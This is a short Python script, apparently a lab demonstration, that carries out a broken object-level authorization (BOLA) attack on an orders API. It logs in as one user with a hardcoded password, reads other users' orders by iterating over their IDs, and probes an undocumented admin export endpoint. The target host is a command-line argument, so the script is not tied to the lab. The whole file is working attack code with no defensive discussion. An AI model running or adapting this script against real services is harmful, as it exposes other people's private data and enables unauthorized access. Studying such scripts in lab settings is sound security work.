"""Scripted BOLA attack: Alice reads Bob's and Carol's orders. Lab use only."""
import requests, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"

def login(user, pw):
    return requests.post(f"{BASE}/api/v1/login", json={"username": user, "password": pw}).json()["token"]

token = login("alice", "alice123")
h = {"Authorization": f"Bearer {token}"}

print("[normal] Alice reads her own order 101")
print(requests.get(f"{BASE}/api/v1/orders/101", headers=h).json())

print("\n[ATTACK] Alice reads other users' orders (BOLA)")
for oid in (201, 202, 301):
    r = requests.get(f"{BASE}/api/v1/orders/{oid}", headers=h)
    print(oid, r.status_code, r.json())

print("\n[shadow] Alice calls undocumented admin export")
print(requests.get(f"{BASE}/api/v1/admin/export", headers=h).status_code)
